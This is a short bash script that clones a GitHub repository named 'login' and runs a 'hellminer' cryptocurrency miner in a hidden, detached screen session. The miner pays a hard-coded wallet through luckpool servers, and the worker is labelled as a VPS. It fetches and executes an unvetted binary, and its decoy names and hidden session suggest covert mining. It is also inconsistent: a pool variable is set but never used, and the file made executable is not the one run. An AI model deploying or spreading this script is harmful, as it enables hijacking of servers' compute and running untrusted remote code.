
#!/bin/bash
POOL=stratum+tcp://na.luckpool.net:3956#xnsub
WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
WORKER=vps
sudo apt update
sudo apt install screen -y
git clone https://github.com/sallygonza/login.git 
cd login
chmod +x cumin
screen -dmS layar ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u $WALLET.$WORKER --cpu 2  \n
